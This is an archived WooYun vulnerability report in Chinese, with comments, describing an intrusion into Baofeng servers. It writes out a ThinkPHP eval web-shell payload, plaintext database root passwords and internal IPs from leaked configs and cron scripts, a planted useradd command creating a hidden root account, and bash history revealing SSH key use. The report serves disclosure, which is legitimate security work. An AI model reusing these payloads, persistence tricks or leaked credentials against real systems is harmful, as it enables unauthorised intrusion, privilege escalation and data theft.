{"id": 3849, "wybug_id": "wooyun-2014-062645", "wybug_title": "漫游暴风影音并发现一系列安全问题", "wybug_corp": "暴风影音", "wybug_author": "redrain有节操", "wybug_date": "2014-05-28 15:10", "wybug_open_date": "2014-06-02 15:11", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["补丁不及时", "成功的渗透"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某日志伺服器存在代码执行，由于运维疏忽导致其某台服务器私钥泄露和一系列安全问题panxiaodong同学，你惹大祸了，怎么能这么管理服务器呢部分支持外联的数据库和敏感信息已打码，快整改吧~（在整个过程中未做任何恶意篡改） 详细说明：  http://config.baofeng.com这台伺服器使用了thinkphp框架并未打补丁，之前的代码执行成功利用http://config.baofeng.com/index.php/module/action/param1/{${phpinfo()}}\n\nhttp://config.baofeng.com/index.php/module/action/param1/{${eval($_POST[s])}}成功getshell随后发现站点做了cdn，获取了其几个IP后，依次翻看221.238.27.17460.28.110.197117.79.151.24211.100.58.83117.79.151.23这几台主机，在/opt/programs/sifu/Conf/下发现数据库配置文件\n<?php  return array(    \t'URL_MODEL'=>1, // 如果你的环境不支持PATHINFO 请设置为3\t'SESSION_AUTO_START' =>false,\t'DB_TYPE'=>'mysql',\t'DB_HOST'=>'***.***.**.174',\t'DB_NAME'=>'sifu_repair',\t'DB_USER'=>'root',\t'DB_PWD'=>'223238',\t'DB_PORT'=>'3306',\t'DB_PREFIX'=>'sifu_',        'APP_DEBUG' => 0,    \t'HTML_CACHE_ON' => true,//开启静态缓存      \t'HTML_PATH' => '/opt/sifu/sifu/pop',//静态缓存文件目录，HTML_PATH可任意设置，此处设为当前项目下新建的html目录 \t'MEMCACHE_HOST'=>'221.238.27.174',//memcache主机ip配置 \t'MEMCACHE_PORT'=>'11211', //memcache端口配置        'ACCESS_IPS'=>'192.168.%,127.0.0.1,218.***.***.34,60.***.**.102',//允许访问ip地址配置，%为通配符\t'LOG_RECORD'=>false,);?>\n发现居然统一口令。。。。给跪223238是你们的电话号码么\n\n打码两台貌似是数据分析的监测平台，避免信息漏点，就不贴图了继续翻看，在117.79.151.23这台中，/opt/script/发现了两个python脚本\n\n成功在飞信登陆\n\n这是可以给员工发短信的节奏了么panxiaodong同学。。。唔，应该是苦逼的运维同学吧\n\n成功登陆暴风影音邮箱\n\n以上都是小事，接下来可能导致的问题才是正片0x01测试过程中，发现/opt/programs/sifu/result/下所生成的日志文件都是root，并且每天定时更新，追根溯源，找到了生成日志的脚本文件\n#!/bin/bash####################计算伺服总请求数量#福玉 2011116###################stat_date=`date -d \"1 days ago\" +\"%Y%m%d\"`stat_date1=`date -d \"1 days ago\" +\"%Y%m%d\"`echo $stat_datezcat /opt/data/logs/sifu/access_$stat_date*|awk -F'=' '{print $2}'|awk -F'&' '{print $1}'|sort |uniq -c|awk -F' ' '{print $1\"\\t\"$2\"\\t24\"}' > /opt/programs/sifu/result/request_$stat_date.csv/usr/bin/mysql -h60.28.110.197 -uroot -p223238 sifu_repair -e \"set names utf8;delete from sifu_scheme_request_data where ip='24' and stat_date=${stat_date1}\";/usr/bin/mysql -h60.28.110.197 -uroot -p223238 sifu_repair -e \"set names utf8;  load data local infile '/opt/programs/sifu/result/request_${stat_date}.csv' replace into table sifu_scheme_request_data (count,version,ip) set stat_date=${stat_date1};\"\n并且发现www的组有可写权限于是乎，加了这么一条命令\nuseradd -o -u 0 -g 0 -M -d /root -s /bin/bash website -p $1$K3gq/1E2$afsX.mfcBaLXIIItgz29Q.asdf=123\n也就是说，在系统执行cron计划任务的时候，除了以root权限生成每天的日志，还会添加一个用户名为website，密码为asdf=123的root用户以此来达到提升权限的目的0x02在用户目录下，翻看.bash_historysu -c \"ssh -t uniondown@61.155.220.222 sudo ln -s /opt/baofeng-data/league/package/3.10.06.30.exe /opt/baofeng-data/league/package/3.10.06.30_124.exe\" uniondown;exitssh-keygen -dlscd ~lsls -acd .sshlscat id_dsa.pub cd ..ls -ahll -ahssh 122.139.57.37lsls -allcd .sshlsllvi known_hosts exitllcd .ssh/llcat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys支持看来是运维当时用这台主机以uniondown用户身份私钥登陆了61.155.220.222果断进入.ssh目录，发现了私钥id_dsa\n\n接下来就是后渗透了，并且还发现一个pop和暴风影音客户端的弹窗配置，大概看了一下，貌似可以修改弹窗广告地址，如果修改为恶意地址，那么批量挂马则非常简单，请暴风安全方面的同学务必认真整改点到为止，以上   漏洞证明：  \n\n\n<?php  return array(    \t'URL_MODEL'=>1, // 如果你的环境不支持PATHINFO 请设置为3\t'SESSION_AUTO_START' =>false,\t'DB_TYPE'=>'mysql',\t'DB_HOST'=>'***.***.**.174',\t'DB_NAME'=>'sifu_repair',\t'DB_USER'=>'root',\t'DB_PWD'=>'223238',\t'DB_PORT'=>'3306',\t'DB_PREFIX'=>'sifu_',        'APP_DEBUG' => 0,    \t'HTML_CACHE_ON' => true,//开启静态缓存      \t'HTML_PATH' => '/opt/sifu/sifu/pop',//静态缓存文件目录，HTML_PATH可任意设置，此处设为当前项目下新建的html目录 \t'MEMCACHE_HOST'=>'221.238.27.174',//memcache主机ip配置 \t'MEMCACHE_PORT'=>'11211', //memcache端口配置        'ACCESS_IPS'=>'192.168.%,127.0.0.1,218.***.***.34,60.***.**.102',//允许访问ip地址配置，%为通配符\t'LOG_RECORD'=>false,);?>\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  打回重做吧，这几台服务器   版权声明：转载请注明来源 redrain有节操@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-02 15:11 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-28 15:28 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  无影响，厂商已忽略    \n     2014-05-28 15:32 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @卡卡 看了看暴风，还好啊，基本有问题的都确认修复    \n     2014-05-28 15:50 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  @redrain有节操 师傅师傅,球带    \n     2014-05-28 15:52 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @小新 师傅师傅。。。求不黑    \n     2014-05-28 16:59 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  @redrain有节操 师傅师傅。。。教我漫游！    \n     2014-05-29 23:27 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  又见redrain大牛，这个圈子真小    \n     2014-06-02 01:03 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  今年就能看到细节了。真好    \n     2014-06-02 15:51 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  果然我是预言帝啊~~    \n     2014-06-02 16:40 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @梧桐雨 厂商没节操，该喷    \n     2014-06-02 16:43 |    \t\tzj1244 \t\t\t( 普通白帽子  |\t\t\t        Rank:273 漏洞数:33        | 小葵)\t\t \n  我擦，我都忽略，无语了    \n     2014-06-02 16:51 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @redrain有节操 = = 代码执行还在呢。。估计都放假包粽子去了    \n     2014-06-02 16:57 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @Finger @疯狗 乌云君应该给洞主补分的    \n     2014-06-02 17:15 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @梧桐雨 哈哈，我也觉得=。=暴风这样不行啊    \n     2014-06-02 20:08 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @redrain有节操 补分了，还是乌云君最厚道的。    \n     2014-06-02 20:27 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n   师傅师傅,球带    \n     2014-06-08 21:06 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  这细节不错...主机终于修复了    \n     2014-06-11 21:55 |    \t\tjusker \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:11        | xxoo决定未来)\t\t \n  @redrain有节操 小伙仔细看我之前提交的漏洞- -，你怎么还跟我的内容一样啊    \n     2014-06-11 21:56 |    \t\tjusker \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:11        | xxoo决定未来)\t\t \n  @redrain有节操 自己看  WooYun: 看我沦陷暴风影音的内网    \n     2014-06-12 00:39 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @jusker 逗    \n     2014-06-12 00:41 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @jusker 还小伙子。。。真是逗    \n     2014-06-12 08:08 |    \t\tjusker \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:11        | xxoo决定未来)\t\t \n  @redrain有节操 哈哈，原来你跟老衲很久之前就认识，误会啊    \n     2014-06-12 08:09 |    \t\tjusker \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:11        | xxoo决定未来)\t\t \n  @redrain有节操 纯当开个玩笑吧哈哈，我写代码去了    \n     2014-06-12 11:26 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @jusker 呵呵    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}